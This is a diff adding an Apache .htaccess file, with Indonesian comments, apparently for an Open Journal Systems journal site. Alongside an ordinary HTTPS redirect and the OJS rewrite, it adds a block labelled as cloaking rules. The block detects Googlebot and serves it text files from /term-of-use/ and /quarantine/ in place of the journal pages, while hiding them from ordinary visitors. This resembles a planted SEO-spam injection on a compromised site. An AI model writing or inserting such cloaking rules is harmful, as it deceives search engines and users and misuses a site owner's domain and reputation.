@@ -1,0 +1,31 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Redirect ke HTTPS
+    RewriteCond %{HTTPS} !=on
+    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
+
+    # ========== CLOAKING RULES (DITAMBAHKAN) ==========
+    # Cloaking untuk Googlebot ke /journals
+    RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
+    RewriteRule ^journals$ /term-of-use/ukinstitute-ib.txt [L]
+    
+    # Cloaking untuk Googlebot ke /journals/jopp
+    RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
+    RewriteRule ^journals/jopp$ /quarantine/jopp.txt [L]
+    
+    # Cloaking untuk Googlebot ke /journals/index.php
+    RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
+    RewriteRule ^journals/index\.php$ /term-of-use/ukinstitute-ib.txt [L]
+    # ========== END CLOAKING RULES ==========
+
+    # OJS 2 rewrite (hanya untuk NON-BOT)
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
+    RewriteRule ^(.*)$ index.php/$1 [QSA,L]
+</IfModule>
+
+<FilesMatch "\.(php4|php5|php3|php2|php|phtml)$">
+    SetHandler application/x-httpd-alt-php56___lsphp
+</FilesMatch>
